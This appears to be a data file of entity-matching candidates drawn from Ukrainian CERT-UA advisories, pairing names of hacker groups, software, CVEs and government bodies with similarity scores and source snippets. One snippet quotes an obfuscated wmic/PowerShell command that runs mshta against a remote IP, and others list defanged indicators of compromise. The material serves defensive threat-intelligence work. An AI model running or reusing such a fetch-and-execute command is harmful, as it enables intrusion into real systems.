queue	label	relation	direction	suggested	ensemble	agreement	claudeVerdict	gptVerdict	rule	source	category	left	right	stratum	mechanism	sim	canonical	snippet	llmRationale	evidence
				review					embedding-neighbour	embedding	Sector	Ukrainian government organizations	українські органи державної влади	c	embedding	0.7238				
	different			different					differing-digits	embedding	HackerGroup	UAC-0010 (Armageddon)	UAC-0063	c	embedding	0.723		left: [doc 39086] Кібератака групи UAC-0010 (Armageddon) на державні інституції країн Європейського Союзу (CERT-UA#4334) ‖ right: [doc 4697016] Шпигунська активність UAC-0063 у відношенні України, Казахстану, Киргизстану, Монголії, Ізраїлю, Індії (CERT-UA#6549)		
	different			different					differing-digits	embedding	HackerGroup	UAC-0010 (Armageddon)	UAC-0028	c	embedding	0.7227		left: [doc 39086] Кібератака групи UAC-0010 (Armageddon) на державні інституції країн Європейського Союзу (CERT-UA#4334) ‖ right: [doc 37788] …pedream. З низьким рівнем впевненості, ураховуючи застосовану тактику, асоціюємо виявлену активність з діяльністю групи UAC-0028 (APT28). Індикатори компрометації hxxps://tinyurl[.]com/2p8kpb9v hxxps://panelunregistertle-348.frge[.]io/ hxxps://eoy7…		
				review					embedding-neighbour	embedding	Software	MS Excel	MS Office	c	embedding	0.7226		left: [doc 20] …йлу. Звертаємо особливу увагу, що бажано обмежити використання макросів та доступ програм MS Office (наприклад MS Word, MS Excel, MS PowerPoint) до мережі Інтернет у разі, якщо немає такої необхідності. Нагадуємо, що ми не рекомендуємо відкривати ф… ‖ right: [doc 20] Коректне налаштування програмного забезпечення MS Office		
	different			different					differing-digits	embedding	Software	CVE-2017-0199	CVE-2020-0609	c	embedding	0.7225		left: [doc 2660] …вальників Petya та Misha у 2017 для поширення яких використовувалася вразливість для віддаленого виконання коду, а саме CVE-2017-0199. ‖ right: [doc 2625] …яючи зловмиснику непомітно розшифровувати, змінювати або вводити дані. Оновлення Windows за посиланням: CVE-2020-0601 . CVE-2020-0609 та CVE-2020-0610 – Критичні Вразливості клієнта віддаленого робочого столу (RDP, стосується всіх підтримуваних версій W…		
	different			different					differing-digits	embedding	Software	Microsoft Windows Server 2003	Windows 2008 R2	c	embedding	0.7225		left: [doc 2661] …і. Вразливі версії ОС Windows: Microsoft Windows 7 for 32-bit Systems SP1 Microsoft Windows 7 for x64-based Systems SP1 Microsoft Windows Server 2003 Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1 Microsoft Windows Server 2008 R2 for x64-based Systems S… ‖ right: [doc 2625] …вано Remote Desktop Gateway. CVE-2020-0611 Всі версії Windows та Windows Server, що підтримуються, а також Windows 7 та Windows 2008 R2, які не підтримуються з 14 січня 2020. Що робити? Якщо Ви використовуєте, одну з вищезгаданих операційних систем, реком…		
				review					embedding-neighbour	embedding	Government Body	Оперативний центр реагування на кіберінциденти	Ситуаційний центр забезпечення кібербезпеки СБУ	c	embedding	0.7224		left: [doc 17580] …; на сторінці у Facebook: https://www.facebook.com/UACERT ; форма повідомлення на сайті: https://cert.gov.ua/contact-us Оперативний центр реагування на кіберінциденти е-mail: soc@cert.gov.ua; тел.: (044) 281-87-37 Оперативно-технічну службу Державного центру кіберзахисту тел.: (044) 28… ‖ right: —		
				review					embedding-neighbour	embedding	Software	WMIC	wmiexec	c	embedding	0.7223		left: [doc 6282536] …ng]::new($XgvTv.TransformFinalBlock($vLQvCFt, 0,$vLQvCFt.Length)); sal fd $ojBFd.Substring(3,3); fd $ojBFd.Substring(6) wmic.exe process call create "powershell -w 1 powershell -Command ('msh' + 'ta.e' + 'xe' + ' hXXps://87.120.126[.]48/1pm')"… ‖ right: [doc 18101] …ідливої програми на ЕОМ у локальних обчислювальних мережах жертв реалізовано за допомогою інструменту Impacket, а саме: wmiexec і/або smbexec. Приклади записів із журнальних файлів Sysmon, що можуть свідчити про згадану активність, наведено на Рис…		
				review					embedding-neighbour	embedding	Government Body	Збройні Сили України	ССО ЗС України	c	embedding	0.7216		left: — ‖ right: [doc 18108] …м (хіба що на основі тризубу та антиросійської діяльності мінера-здирника) пов’язує «хакерське угруповання Encrpt3d» та ССО ЗС України. Отже, навмисне застосування 13-14 січня 2022 року шкідливої програми WhisperKill, що має морфологічні схожості зі шкід…		
	different			different					differing-digits	embedding	Software	Microsoft Windows Server 2008 R2 for x64-based Systems SP1	Windows Server 2008	c	embedding	0.7215		left: [doc 2661] …for x64-based Systems SP1 Microsoft Windows Server 2003 Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1 Microsoft Windows Server 2008 R2 for x64-based Systems SP1 Microsoft Windows Server 2008 for 32-bit Systems SP2 Microsoft Windows Server 2008 for Itanium-based Systems SP2 Micros… ‖ right: [doc 2660] …(KB3178710) Office 2010 (KB3141538) Office 2016 (KB3178703) Windows 7 (KB4015549) Windows 7 (KB4015546) Windows Vista, Windows Server 2008 (KB4014793) Windows Server 2012 (KB4015551) Windows Server 2012 (KB4015548)); - при можливості, заблокувати додаткам Mi…		
				review					embedding-neighbour	embedding	Sector	місцеве самоврядування	органи місцевого самоврядування України	c	embedding	0.7214				
				review					embedding-neighbour	embedding	Sector	Органи державної влади	сайти державних органів	c	embedding	0.7212		left: — ‖ right: [doc 17899] Кібератака на сайти державних органів		
				review					embedding-neighbour	embedding	Software	Icloud.exe	iclouds.cmd	c	embedding	0.7211		left: [doc 2807] …айлів з архіву НПУ.rar виконувана компонента spisok_24.08.2018.com (ехе файл) автоматично розпаковується на виконувані (Icloud.exe, Iclouding.exe, ipad.system) та командні файли (iclouds.cmd, iclouds.cmd), метою яких є збір даних враженої системи та… ‖ right: [doc 2807] …018.com (ехе файл) автоматично розпаковується на виконувані (Icloud.exe, Iclouding.exe, ipad.system) та командні файли (iclouds.cmd, iclouds.cmd), метою яких є збір даних враженої системи та передача даних програмою Iclouding.exe до командного серверу…		
				review					embedding-neighbour	embedding	Government Body	Оперативний центр реагування на кіберінциденти та кібератаки (SOC) Державного центру кіберзахисту	Оперативно-технічну службу Державного центру кіберзахисту	c	embedding	0.7211		left: — ‖ right: [doc 17580] …://cert.gov.ua/contact-us Оперативний центр реагування на кіберінциденти е-mail: soc@cert.gov.ua; тел.: (044) 281-87-37 Оперативно-технічну службу Державного центру кіберзахисту тел.: (044) 281-88-01 З метою попередження та зменшення наслідків впливу від можливих спроб несанкціонованого втручання…		
				review					embedding-neighbour	embedding	Government Body	Міністерство закордонних справ України	Міністерство юстиції України	c	embedding	0.721				
				review					embedding-neighbour	embedding	Software	Mozilla	Mozilla Firefox	c	embedding	0.7207		left: [doc 2722] …е вимагає будь-яких дій, пов'язаних із керуванням сертифікатами. Вразливі веб-браузери: Internet Explorer Chrome Safari Mozilla Рекомендації: Сторона сервера: Використовуйте інспектор сертифікатів DigiCert для сканування на вразливість серверів та… ‖ right: [doc 3028] …робити скріншоти та отримувати облікові дані, що використовуються в різних програмах системи (наприклад Google Chrome, Mozilla Firefox, Microsoft Outlook, IceDragon, FILEZILLA, тощо). З’явився Agent Tesla в 2014 році і виконував функції кейлогера та викр…		
				review					embedding-neighbour	embedding	Software	MS PowerPoint	Microsoft Word	c	embedding	0.7202		left: [doc 20] …аємо особливу увагу, що бажано обмежити використання макросів та доступ програм MS Office (наприклад MS Word, MS Excel, MS PowerPoint) до мережі Інтернет у разі, якщо немає такої необхідності. Нагадуємо, що ми не рекомендуємо відкривати файли, що надійш… ‖ right: [doc 2660] …сть для віддаленого виконання коду, а саме CVE-2017-0199. При отриманні листів з посиланнями на ресурс для завантаження Microsoft Word документу або ж просто з прикріпленим документом (наприклад з розширенням .rtf, .docx) потрібно бути особливо пильними,…		
				review					embedding-neighbour	embedding	Government Body	Державний центр кіберзахисту	Кіберцентр Державної прикордонної служби України	c	embedding	0.7202		left: [doc 14958] …и регулярне резервне копіювання важливих систем та даних. Для попередження та швидкого реагування на можливі кібератаки Державний центр кіберзахисту буде працювати в посиленому режимі. Просимо у випадку виявлення ознак кібератаки або аномальних дій в Ваших інформаційн… ‖ right: [doc 18365] Урядовою командою реагування на комп’ютерні надзвичайні події України CERT-UA від суб’єкту координації (Кіберцентр Державної прикордонної служби України) отримано інформацію щодо розповсюдження, начебто, від імені ДП «Адміністрація морських портів України», електронних по…		
	different			different					differing-digits	embedding	HackerGroup	UAC-0010 (Armageddon)	UAC-0056	c	embedding	0.7201		left: [doc 39086] Кібератака групи UAC-0010 (Armageddon) на державні інституції країн Європейського Союзу (CERT-UA#4334) ‖ right: [doc 18273] …рямована на державні організації України. Відслідковується CERT-UA не пізніше ніж з квітня 2021 року за ідентифікатором UAC-0056. Індикатори компрометації Файли: 0e16df6845cde1260087902f25842f79 d5aadb4ace8ffccb.zip fa23f43fa759f0f38cde2b703d98ba05…		
				review					embedding-neighbour	embedding	Sector	органи державної влади України	організації України	c	embedding	0.7197		left: [doc 3804703] …для віддаленого адміністрування RemoteUtilities. Виходячи з того, що об'єктами кібератак, зазвичай (але не виключно), є органи державної влади України, а також, беручи до уваги функціонал використовуваних програм, вважаємо, що активність здійснюється з метою шпигунства.… ‖ right: —		
				review					embedding-neighbour	embedding	Sector	організації	українські організації	c	embedding	0.7192				
				review					embedding-neighbour	embedding	Sector	Органи державної влади	державні організації	c	embedding	0.7191				
				review					embedding-neighbour	embedding	Software	Icloud.exe	IcloudSecurity.lnk	c	embedding	0.7189		left: [doc 2807] …айлів з архіву НПУ.rar виконувана компонента spisok_24.08.2018.com (ехе файл) автоматично розпаковується на виконувані (Icloud.exe, Iclouding.exe, ipad.system) та командні файли (iclouds.cmd, iclouds.cmd), метою яких є збір даних враженої системи та… ‖ right: [doc 2807] …db509d71 https://www.virustotal.com/#/file/b024234d583b3adb5ae4ec3809d316b4f2f48839b3d9baec615750f35ce231cc/detection ./IcloudSecurity.lnk MD5: 355b8b3170f01c5db98461b7451008d6 https://www.virustotal.com/#/file/cce68c4b705595610289293922b96513d71d8b376f6e9fe…		
				review					embedding-neighbour	embedding	Software	Browser.ps1	init.ps1	c	embedding	0.7181		left: [doc 6281123] …оманда забезпечить завантаження і запуск HTA-файлу "browser.hta" (очистить вміст буферу обміну) та PowerShell-сценарію "Browser.ps1", основним призначенням якого є: завантаження і запуск SSH для побудови тунелю викрадення та ексфільтрацію автентифікац… ‖ right: [doc 6281701] …-приманки "ArmyPlus.exe", містить файли інтерпретатору Python, архів з файлами програми Tor, а також PowerShell-скрипт "init.ps1". У випадку відкриття файлу "ArmyPlusInstaller-v.0.10.23722.exe" буде здійснено запуск файлу-приманки, а також PowerShe…		
				review					embedding-neighbour	embedding	Government Body	Збройні Сили України	СБ України	c	embedding	0.7181		left: — ‖ right: [doc 3761023] …a та CSIRT MON (Республіка Польща) виявлено аналогічні фішингові ресурси, що імітують офіційні вебсторінки МЗС України, СБ України, а також Поліції Польщі. Слід зауважити, що в червні 2022 року подібна фішінгова вебсторінка імітувала вебінтерфейс пош…		
				review					embedding-neighbour	embedding	Government Body	Адміністрація Держспецзв'язку	ДЦКЗ Держспецзв'язку	c	embedding	0.718		left: — ‖ right: [doc 5455833] "Змініть пароль до Roundcube": чергова фішингова атака з використанням атрибутів CERT-UA та символіки ДЦКЗ Держспецзв'язку (CERT-UA#7223)		
				review					embedding-neighbour	embedding	Government Body	Оперативний центр реагування на кіберінциденти	Оперативно-технічну службу Державного центру кіберзахисту	c	embedding	0.718		left: [doc 17580] …; на сторінці у Facebook: https://www.facebook.com/UACERT ; форма повідомлення на сайті: https://cert.gov.ua/contact-us Оперативний центр реагування на кіберінциденти е-mail: soc@cert.gov.ua; тел.: (044) 281-87-37 Оперативно-технічну службу Державного центру кіберзахисту тел.: (044) 28… ‖ right: [doc 17580] …://cert.gov.ua/contact-us Оперативний центр реагування на кіберінциденти е-mail: soc@cert.gov.ua; тел.: (044) 281-87-37 Оперативно-технічну службу Державного центру кіберзахисту тел.: (044) 281-88-01 З метою попередження та зменшення наслідків впливу від можливих спроб несанкціонованого втручання…		
				review					embedding-neighbour	embedding	Software	MS Excel	MS Word	c	embedding	0.717		left: [doc 20] …йлу. Звертаємо особливу увагу, що бажано обмежити використання макросів та доступ програм MS Office (наприклад MS Word, MS Excel, MS PowerPoint) до мережі Інтернет у разі, якщо немає такої необхідності. Нагадуємо, що ми не рекомендуємо відкривати ф… ‖ right: [doc 20] …маного файлу. Звертаємо особливу увагу, що бажано обмежити використання макросів та доступ програм MS Office (наприклад MS Word, MS Excel, MS PowerPoint) до мережі Інтернет у разі, якщо немає такої необхідності. Нагадуємо, що ми не рекомендуємо ві…		
				review					embedding-neighbour	embedding	Government Body	Державний центр кіберзахисту	Національний центр інтеграції кібербезпеки і комунікацій (NCCIC)	c	embedding	0.717		left: [doc 14958] …и регулярне резервне копіювання важливих систем та даних. Для попередження та швидкого реагування на можливі кібератаки Державний центр кіберзахисту буде працювати в посиленому режимі. Просимо у випадку виявлення ознак кібератаки або аномальних дій в Ваших інформаційн… ‖ right: [doc 2701] Національний центр інтеграції кібербезпеки і комунікацій (NCCIC) на своєму сайті повідомляє про глобальну кампанію з підміни DNS-записів. Використовуючи скомпрометовані облікові дані,…		
				review					embedding-neighbour	embedding	Sector	Нотаріуси України	органи юстиції та нотаріату України	c	embedding	0.717		left: — ‖ right: [doc 5628441] …відома та врахування в роботі.exe.bzip", що, в свою чергу, дозволяє зробити припущення щодо спрямованості кібератак на органи юстиції та нотаріату України. З технічної точки зору ланцюг ураження полягає у запуску BAT/CMD-файлу, що містить PowerShell-код, призначений для дек…		
				review					embedding-neighbour	embedding	Government Body	Державний центр кіберзахисту та протидії кіберзагрозам Держспецзв’язку	Ситуаційний центр забезпечення кібербезпеки СБУ	c	embedding	0.7168				
				review					embedding-neighbour	embedding	Government Body	Національний координаційний центр кібербезпеки РНБО України (НКЦК)	Оперативний центр реагування на кіберінциденти	c	embedding	0.7165		left: — ‖ right: [doc 17580] …; на сторінці у Facebook: https://www.facebook.com/UACERT ; форма повідомлення на сайті: https://cert.gov.ua/contact-us Оперативний центр реагування на кіберінциденти е-mail: soc@cert.gov.ua; тел.: (044) 281-87-37 Оперативно-технічну службу Державного центру кіберзахисту тел.: (044) 28…		
				review					embedding-neighbour	embedding	Sector	Веб-ресурси державних органів України	державні інформаційні ресурси	c	embedding	0.7164		left: — ‖ right: [doc 14958] …редодні та під час святкування 30-ї річниці Дня Незалежності України існує висока ймовірність кібератак, спрямованих на державні інформаційні ресурси, інформаційні та телекомунікаційні системи органів державної влади та місцевого самоврядування, державних та приватних…		
				review					embedding-neighbour	embedding	Software	Iclouding.exe	iclouds.cmd	c	embedding	0.7162		left: [doc 2807] …ву НПУ.rar виконувана компонента spisok_24.08.2018.com (ехе файл) автоматично розпаковується на виконувані (Icloud.exe, Iclouding.exe, ipad.system) та командні файли (iclouds.cmd, iclouds.cmd), метою яких є збір даних враженої системи та передача даних… ‖ right: [doc 2807] …018.com (ехе файл) автоматично розпаковується на виконувані (Icloud.exe, Iclouding.exe, ipad.system) та командні файли (iclouds.cmd, iclouds.cmd), метою яких є збір даних враженої системи та передача даних програмою Iclouding.exe до командного серверу…		
				review					embedding-neighbour	embedding	Government Body	Державний центр кіберзахисту та протидії кіберзагрозам Держспецзв’язку	Національний центр інтеграції кібербезпеки і комунікацій (NCCIC)	c	embedding	0.7159		left: — ‖ right: [doc 2701] Національний центр інтеграції кібербезпеки і комунікацій (NCCIC) на своєму сайті повідомляє про глобальну кампанію з підміни DNS-записів. Використовуючи скомпрометовані облікові дані,…		
				review					embedding-neighbour	embedding	Software	Microsoft Exchange Server 2016	Windows Server 2016	c	embedding	0.7157		left: [doc 11113] …упні версії Microsoft Exchange Server: Microsoft Exchange Server 2010 Microsoft Exchange Server 2013 (< 15.00.1497.012) Microsoft Exchange Server 2016 (CU18 < 15.01.2106.013, CU19 < 15.01.2176.009) Microsoft Exchange Server 2019 (CU8 < 15.02.0792.010) Компанія Microsoft… ‖ right: [doc 2625] …а. Оновлення Windows за посиланням: CVE-2020-0611 . Операційні системи, на яких є вразливості: CVE-2020-0601 Windows 10 Windows Server 2016 Windows Server 2019 CVE-2020-0609 та CVE-2020-0610 Всі версії Windows Server, що підтримуються та на яких інстальовано…		
				review					embedding-neighbour	embedding	Government Body	Державний центр кіберзахисту	Оперативний центр реагування на кіберінциденти та кібератаки (SOC) Державного центру кіберзахисту	c	embedding	0.7154		left: [doc 14958] …и регулярне резервне копіювання важливих систем та даних. Для попередження та швидкого реагування на можливі кібератаки Державний центр кіберзахисту буде працювати в посиленому режимі. Просимо у випадку виявлення ознак кібератаки або аномальних дій в Ваших інформаційн… ‖ right: —		
				review					embedding-neighbour	embedding	Sector	державні організації України	державні установи	c	embedding	0.7154		left: [doc 18273] Кібератака на державні організації України з використанням шкідливих програм SaintBot та OutSteel (CERT-UA#3785) ‖ right: [doc 2808] …пропонують перейти, у відсутності незначних помилок (відмінностей) у доменному імені державної установи. Нагадуємо: усі державні установи в Україні мають єдине доменне ім’я – gov.ua та вигляд statewebsite.gov.ua. Усі інші доменні розширення є ознакою фішинг…		
				review					embedding-neighbour	embedding	Software	loader.exe	one.exe	c	embedding	0.7146		left: [doc 39934] …4266c9a464d196b b.exe 493c8de446f2c442d781cd0fe22ca813 a5f713ca2ba69af2ad2a2631b2369c250c3b359513ec93c26a075bde3f659389 loader.exe Мережеві: admin@rs500cosworth.com tcp://195[.]211.99.29:28334 195[.]211.99.29 Хостові: C:\Windows\System32\WindowsPower… ‖ right: [doc 37704] …ко 60МБ. З'ясовано, що згаданий файл забезпечить виконання завантажувача "alt.exe", який здійснить завантаження файлів "one.exe" та "dropper.exe" з сервісу Discord та їхній запуск. В рамках дослідження визначено, що запуск "one.exe" призведе до ур…		
	different			different					differing-digits	embedding	Software	stage1.ps1	z.ps1	c	embedding	0.7146		left: [doc 703548] …ce47cc47319a oYUuQbXu f063766d0481194829be3c5db209bfcf df4724e21d9dea9b3e7f38b1ad905ad1922d30b6142da01c0218ed80644ca22a stage1.ps1 6cac251512ecd9f0627cf0da5d0a0ff7 e390d3d9004124616a18d10dc5b9f6eeab6b01bd167fac4d783036af574a4278 stage2.ps1 a3cf45b620… ‖ right: [doc 39934] …й ISO-файл містить документ-приманку "a.docx", LNK-файл "УКАЗ ПРЕЗИДЕНТА УКРАЇНИ №151_2022.mp4.lnk", PowerShell-скрипт "z.ps1" та EXE-файл "b.exe". У випадку запуску LNK-файлу, останній виконає PowerShell-скрипт, який, у свою чергу, відкриє DOCX…		
				review					embedding-neighbour	embedding	Sector	Information systems of Ukrainian enterprises	Ukrainian enterprises	c	embedding	0.7144				
				review					embedding-neighbour	embedding	Software	Microsoft Windows	Windows 10	c	embedding	0.7142		left: [doc 2660] …а документ з розширенням .docx - посилання на інший файл. Зазначимо, що ole-обʼєкт може завантажити і виконати сторонню Microsoft Windows програму, в тому числі скрипт. Інфікування системи відбувається саме при виконанні такого завантаженого файла, програми… ‖ right: [doc 2625] …м віддаленого робочого столу (RDP). Вразливості: CVE-2020-0601 – Серйозна Вразливість перевірки сертифікатів ECC є у MS Windows 10, MS Server 2016 та MS Server 2019. Вразливість дозволяє, обходячи надійне сховище, небажаному чи шкідливому програмному…		
				review					embedding-neighbour	embedding	Government Body	Національний координаційний центр кібербезпеки	Центр кібербезпеки ІТС	c	embedding	0.7138		left: — ‖ right: [doc 5160737] …озділу. У випадку самостійного виявлення факту ураження за наведеними в статті індикаторами - невідкладно поінформувати Центр кібербезпеки ІТС. Індикатори кіберзагроз Мережеві: AS207713 (@gir.network) 45[.]82.13.86 185[.]247.184.134 195[.]133.88.34 89[.]185.84.3…		
				review					embedding-neighbour	embedding	Sector	органи державної влади України	органи місцевого самоврядування	c	embedding	0.7137		left: [doc 3804703] …для віддаленого адміністрування RemoteUtilities. Виходячи з того, що об'єктами кібератак, зазвичай (але не виключно), є органи державної влади України, а також, беручи до уваги функціонал використовуваних програм, вважаємо, що активність здійснюється з метою шпигунства.… ‖ right: —		
	different			different					differing-digits	embedding	Software	DROWN (CVE-2016-0800)	POODLE (CVE-2014-3566)	c	embedding	0.7126				
				review					embedding-neighbour	embedding	Software	Microsoft Windows Server 2003	Microsoft Windows XP	c	embedding	0.7123		left: [doc 2661] …і. Вразливі версії ОС Windows: Microsoft Windows 7 for 32-bit Systems SP1 Microsoft Windows 7 for x64-based Systems SP1 Microsoft Windows Server 2003 Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1 Microsoft Windows Server 2008 R2 for x64-based Systems S… ‖ right: [doc 2661] …SP2 Microsoft Windows Server 2008 for Itanium-based Systems SP2 Microsoft Windows Server 2008 for x64-based Systems SP2 Microsoft Windows XP Рекомендації: 1. Якщо ви користуєтесь однією з перелічених систем потрібно НЕГАЙНО встановити оновлення Windows, які ус…		
				review					embedding-neighbour	embedding	Sector	підприємства	підприємства, установи та організації різної форми власності	c	embedding	0.7123				
				review					embedding-neighbour	embedding	Government Body	Державний центр кіберзахисту	Оперативний центр реагування на кіберінциденти Державного центру кіберзахисту Держспецзв’язку	c	embedding	0.7115		left: [doc 14958] …и регулярне резервне копіювання важливих систем та даних. Для попередження та швидкого реагування на можливі кібератаки Державний центр кіберзахисту буде працювати в посиленому режимі. Просимо у випадку виявлення ознак кібератаки або аномальних дій в Ваших інформаційн… ‖ right: —		
				review					embedding-neighbour	embedding	Government Body	Security Service of Ukraine (SBU)	Державна служба спеціального зв’язку та захисту інформації України	c	embedding	0.7114				
				review					embedding-neighbour	embedding	Sector	Органи державної влади	державні органи та органи місцевого самоврядування України	c	embedding	0.7112				
				review					embedding-neighbour	embedding	Sector	Веб-ресурси державних органів України	Веб-ресурси українських банків	c	embedding	0.7111				
				review					embedding-neighbour	embedding	Sector	державні органи	державні організації України	c	embedding	0.7111		left: — ‖ right: [doc 18273] Кібератака на державні організації України з використанням шкідливих програм SaintBot та OutSteel (CERT-UA#3785)		
				review					embedding-neighbour	embedding	Government Body	Департамент кіберполіції Національної поліції України	Кіберцентр Державної прикордонної служби України	c	embedding	0.7106		left: — ‖ right: [doc 18365] Урядовою командою реагування на комп’ютерні надзвичайні події України CERT-UA від суб’єкту координації (Кіберцентр Державної прикордонної служби України) отримано інформацію щодо розповсюдження, начебто, від імені ДП «Адміністрація морських портів України», електронних по…		
				review					embedding-neighbour	embedding	Sector	державні органи та органи місцевого самоврядування України	державні установи України	c	embedding	0.7106		left: — ‖ right: [doc 10011] Масштабна фішингова атака на державні установи України 19.01.2021		
				review					embedding-neighbour	embedding	Software	360Chrome Browser	Chromium Browser	c	embedding	0.7096		left: [doc 3028] …r Kometa Browser Amigo Browser Brave Browser CentBrowser Liebao Browser Elements Browser Vivaldi Browser Citrio Browser 360Chrome Browser Uran Browser Chedot Browser Orbitum Browser Sputnik Browser Comodo Dragon Browser CocCoc Browser QIP Surf Browser Coowo… ‖ right: [doc 3028] …ані, зокрема, з такого програмного забезпечення (список не повний): Yandex Browser Iridium Browser Epic Privacy Browser Chromium Browser 7Star Browser Torch Browser ChromePlus Browser Kometa Browser Amigo Browser Brave Browser CentBrowser Liebao Browser El…		
				review					embedding-neighbour	embedding	Software	installer.exe	one.exe	c	embedding	0.7096		left: [doc 10011] …для віддаленого доступу (RAT). Мал.5 «Електронний запит.ехе» В свою чергу «Електронний запит.ехе» містить в собі файли «installer.exe» та «host_news_mod_mod.msi». Файл «installer.exe» є старою версією легального програмного забезпечення для віддаленого… ‖ right: [doc 37704] …ко 60МБ. З'ясовано, що згаданий файл забезпечить виконання завантажувача "alt.exe", який здійснить завантаження файлів "one.exe" та "dropper.exe" з сервісу Discord та їхній запуск. В рамках дослідження визначено, що запуск "one.exe" призведе до ур…		
				review					embedding-neighbour	embedding	Government Body	Національний координаційний центр кібербезпеки	Центр кібербезпеки ЗСУ (ЦКБ)	c	embedding	0.7096				
				review					embedding-neighbour	embedding	Software	SmartFTP	WS_FTP	c	embedding	0.7092		left: [doc 3028] …d Claws Mail Postbox Credential Outlook Foxmail Opera Mail Pocomail Becky! OpenVPN FileZilla WinSCP Paltalk jDownloader SmartFTP FTP Commander WS_FTP FTPGetter Trillian Також визначаються реквізити користувачів та інфікованого пристрою: Визначаютьс… ‖ right: [doc 3028] …edential Outlook Foxmail Opera Mail Pocomail Becky! OpenVPN FileZilla WinSCP Paltalk jDownloader SmartFTP FTP Commander WS_FTP FTPGetter Trillian Також визначаються реквізити користувачів та інфікованого пристрою: Визначаються дані процесору та о…		
				review					embedding-neighbour	embedding	Software	csrss.exe (DoubleZero)	csrss.zip	c	embedding	0.7092		left: [doc 38088] …pcrs.exe (DoubleZero) b4f0ca61ab0c55a542f32bd4e66a7dc2 30b3cbe8817ed75d8221059e4be35d5624bd6b5dc921d4991a7adc4c3eb5de4a csrss.exe (DoubleZero) Графічні зображення: ‖ right: [doc 38088] …крайне опасно!!!.zip 989c5de8ce5ca07cc2903098031c7134 8dd8b9bd94de1e72f0c400c5f32dcefc114cc0a5bf14b74ba6edc19fd4aeb2a5 csrss.zip 7d20fa01a703afa8907e50417d27b0a4 3b2e708eaa4744c76a633391cf2c983f4a098b46436525619e5ea44e105355fe cpcrs.exe (DoubleZero…		
				review					embedding-neighbour	embedding	Sector	Government bodies and enterprises of Ukraine	Ukrainian government organizations	c	embedding	0.7091				
				review					embedding-neighbour	embedding	Sector	Energy sector	Heat supply sector	c	embedding	0.7088				
	different			different					differing-digits	embedding	Software	Microsoft Windows Server 2008 for x64-based Systems SP2	Windows 2008 R2	c	embedding	0.7088		left: [doc 2661] …ms SP1 Microsoft Windows Server 2008 for 32-bit Systems SP2 Microsoft Windows Server 2008 for Itanium-based Systems SP2 Microsoft Windows Server 2008 for x64-based Systems SP2 Microsoft Windows XP Рекомендації: 1. Якщо ви користуєтесь однією з перелічених систем потрібно НЕГАЙНО встановити онов… ‖ right: [doc 2625] …вано Remote Desktop Gateway. CVE-2020-0611 Всі версії Windows та Windows Server, що підтримуються, а також Windows 7 та Windows 2008 R2, які не підтримуються з 14 січня 2020. Що робити? Якщо Ви використовуєте, одну з вищезгаданих операційних систем, реком…		
				review					embedding-neighbour	embedding	Software	VMware Fusion Pro	VMware Workstation Player	c	embedding	0.7087		left: [doc 2496] …разливостей (CVE-2020-3957, CVE-2020-3958, CVE-2020-3959) в VMware ESXi, VMware Workstation Pro / Player (Workstation), VMware Fusion Pro / Fusion (Fusion), VMRC для Mac, клієнтів VMware Horizon для Mac. Зловмисник може скористатися цими вразливостями, щоб… ‖ right: —		
				review					embedding-neighbour	embedding	Sector	державні установи України	українські органи державної влади	c	embedding	0.7087		left: [doc 10011] Масштабна фішингова атака на державні установи України 19.01.2021 ‖ right: —		
				review					embedding-neighbour	embedding	Sector	українські органи державної влади	українські організації	c	embedding	0.7086				
				review					embedding-neighbour	embedding	Government Body	Державна служба спеціального зв’язку та захисту інформації України	Державний центр кіберзахисту Держспецзв’язку	c	embedding	0.7085		left: — ‖ right: [doc 2628] Державний центр кіберзахисту Держспецзв’язку спільно з Ситуаційним центром забезпечення кібербезпеки СБУ за участі представників компанії «Cloudflare Inc.» перевіри…		
				review					embedding-neighbour	embedding	Government Body	Державний центр кіберзахисту	Ситуаційний центр забезпечення кібербезпеки СБУ	c	embedding	0.7084		left: [doc 14958] …и регулярне резервне копіювання важливих систем та даних. Для попередження та швидкого реагування на можливі кібератаки Державний центр кіберзахисту буде працювати в посиленому режимі. Просимо у випадку виявлення ознак кібератаки або аномальних дій в Ваших інформаційн… ‖ right: —		
